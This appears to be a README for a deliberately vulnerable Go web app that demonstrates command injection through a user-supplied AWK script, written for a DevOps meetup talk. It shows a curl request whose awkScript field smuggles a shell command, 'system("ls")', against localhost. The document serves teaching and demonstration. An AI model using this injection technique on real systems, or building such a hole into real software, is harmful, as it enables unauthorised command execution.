# Vulnerable-AWK-Playground

This application is a demonstration of command injection susceptibility designed for presentation
purposes at the `Vienna Devops Meetup`.

## Instructions

* Initiate the web server by executing
```
go run main.go
```

* Ping any website using
```
curl -X POST -F 'text=hello world' -F 'awkScript={print $1}' localhost:8080/test
```

* Conduct a command injection by using
```
curl -X POST -F 'text=hello world' -F 'awkScript=BEGIN{system("ls")}' localhost:8080/test
```
